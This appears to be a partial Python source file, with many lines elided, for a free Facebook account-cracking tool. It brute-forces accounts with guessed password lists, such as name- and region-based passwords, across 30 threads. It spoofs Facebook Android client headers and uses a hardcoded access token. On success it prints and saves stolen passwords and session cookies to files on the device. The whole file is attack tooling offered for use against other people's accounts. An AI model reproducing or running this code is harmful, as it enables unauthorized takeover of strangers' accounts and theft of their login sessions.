#OPEN SOURCE PUBLISHED BY HEX-PLUS
...
try:
  ...
  import pycurl
os.system('xdg-open https://www.facebook.com/profile.php?id=61553355362483&mibextid=ZbWKwL')
...
for nt in range(10000):
    ...
    rx=random.randrange(1, 999) #OPEN SOURCE PUBLISHED BY HEX+
...
==============================================
\033[1;32m----------------------------------------------
 Owner        :   BIKRAM TRICKER 
 AUTHOR       :   HASSAN-TRICKER
 GITHUB       :   Hassan-bikram 
 WHATSAPP     :   Link on my youtube 
 TOOL         :   Free
 VIRSION      :   0.1
\033[1;37m----------------------------------------------"""
def linex():
...
def pak():
                ...
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED') #OPEN SOURCE PUBLISHED BY HEX+
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python PATHAN.py')
...
def afg():
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        print('[+] Process has been started \033[1;97m')
                        linex()
                        for psx in user: #OPEN SOURCE PUBLISHED BY HEX+
                                ids = code+psx
                                passlist = [psx,ids,'Afghan123','khan1122','khan12345','khan123','Afghanistan','khan12','۱۰۰۲۰۰','Afghan1234','afghan12345','afghan123','afghan1234','Afghan12345','afghanistan','afghan1122','123456','100200','Afghan12','۱۲۳۴۵۶','kabul123']
                                TRT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def gmail():
                ...
                with tred(max_workers=30) as PATHAN:
                        total = str(len(fo))
                        clear()
                        ...
                        for user in fo:
                                ...
                                PATHAN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [PATHAN-F1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-PATHAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/PATHAN-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/PATHAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[PATHAN-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-PATHAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/PATHAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/PATHAN-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [PATHAN-F2 ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A' #OPEN SOURCE PUBLISHED BY HEX+
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [-PATHAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/-PATHAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [-PATHAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/PATHAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [PATHAN-F3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A' #OPEN SOURCE PUBLISHED BY HEX-PLUS
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [-PATHAN-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/PATHAN-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/PATHAN--OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [PATHAN-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PATHAN-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [PATHAN-Rnd] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = 'Dalvik/1.6.0 (Linux; U; Android 9; Google Pixel 3a Build/PQ1A.200105.004) [FBAN/FB4A;FBAV/;{application_version};FBBV/{application_version}FBDM/{density=2.0,width=1080,height=2220};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Verizon;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 3a;FBSV/9;FBOP/1;FBCA/armeabi-v7a;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [PATHAN==>OK]\33[0;m\033[1;33m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("") 
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/KING PATHAN.txt','a').write(coki+'\n')
                                        open('/sdcard/KING PATHAN R.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [PATHAN R👉CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/PATHAN R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
